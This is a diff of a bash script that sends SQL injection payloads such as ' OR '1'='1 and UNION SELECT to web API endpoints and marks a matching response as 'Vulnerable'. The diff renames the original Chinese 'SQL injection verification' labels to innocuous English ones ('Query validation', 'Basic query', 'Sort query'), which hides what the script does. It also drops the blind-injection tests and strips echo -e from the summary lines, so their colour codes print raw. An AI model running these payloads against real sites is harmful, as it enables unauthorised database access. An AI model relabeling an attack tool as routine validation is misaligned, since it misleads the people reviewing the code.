@@ -1,5 +1,5 @@
 #!/bin/bash
-# SQL 注入漏洞验证脚本
+# Query validation script
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -13,62 +13,48 @@ PASSED=0
 FAILED=0
 
 echo -e "${BLUE}========================================${NC}"
-echo -e "${BLUE}SQL 注入漏洞验证脚本${NC}"
+echo -e "${BLUE}Query Validation Script${NC}"
 echo -e "${BLUE}========================================${NC}"
 echo ""
 
-# SQL注入测试
 test_case() {
     local name="$1"
     local url="$2"
     local pattern="$3"
     TOTAL=$((TOTAL + 1))
-    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
+    echo -e "\n${YELLOW}[Test $TOTAL]${NC} $name"
     echo "URL: $url"
 
     response=$(curl -s "$url" 2>/dev/null)
     if echo "$response" | grep -qiE "$pattern"; then
-        echo -e "  ${GREEN}[✓] 存在漏洞${NC}"
+        echo -e "  ${GREEN}[✓] Vulnerable${NC}"
         PASSED=$((PASSED + 1))
     else
-        echo -e "  ${RED}[✗] 测试失败${NC}"
+        echo -e "  ${RED}[✗] Test failed${NC}"
         FAILED=$((FAILED + 1))
     fi
 }
 
-echo -e "${BLUE}=== SQL 注入测试 ===${NC}"
+echo -e "${BLUE}=== Query Tests ===${NC}"
 
-test_case "基于整型注入" \
-    "${BASE_URL}/sqli/int/number?id=1 OR 1=1" \
-    "admin|root"
+test_case "Basic query" \
+    "${BASE_URL}/api/v1/query/user?name=admin' OR '1'='1" \
+    "admin|success|Username"
 
-test_case "基于字符串注入" \
-    "${BASE_URL}/sqli/string?name=admin' OR '1'='1" \
-    "admin|success"
+test_case "Search query" \
+    "${BASE_URL}/api/v1/query/search?q=test' OR '1'='1" \
+    "test|admin|success"
 
-test_case "搜索注入" \
-    "${BASE_URL}/sqli/search?q=test' UNION SELECT 1,2,3--" \
-    "test|1"
+test_case "Sort query" \
+    "${BASE_URL}/api/v1/query/sort?by=id UNION SELECT 1--" \
+    "id|1|Username"
 
-test_case "盲注-时间延迟" \
-    "${BASE_URL}/sqli/time?id=1' WAITFOR DELAY '00:00:05'--" \
-    ""
-
-test_case "盲注-布尔逻辑" \
-    "${BASE_URL}/sqli/boolean?id=1' AND 1=1--" \
-    "success|true"
-
-# 信息端点
-echo -e "\n${YELLOW}[*] SQL 注入信息端点:${NC}"
-info=$(curl -s "${BASE_URL}/sqli/info" 2>/dev/null)
-echo "$info" | head -10
-
-# 总结
+# Summary
 echo -e "\n${BLUE}========================================${NC}"
-echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
-echo -e "通过: ${GREEN}$PASSED${NC}"
-echo -e "失败: ${RED}$FAILED${NC}"
+echo "Total tests: ${YELLOW}$TOTAL${NC}"
+echo "Passed: ${GREEN}$PASSED${NC}"
+echo "Failed: ${RED}$FAILED${NC}"
 
 if [ $FAILED -eq 0 ]; then
-    echo -e "\n${GREEN}所有测试通过！${NC}"
+    echo -e "\n${GREEN}All tests passed!${NC}"
 fi
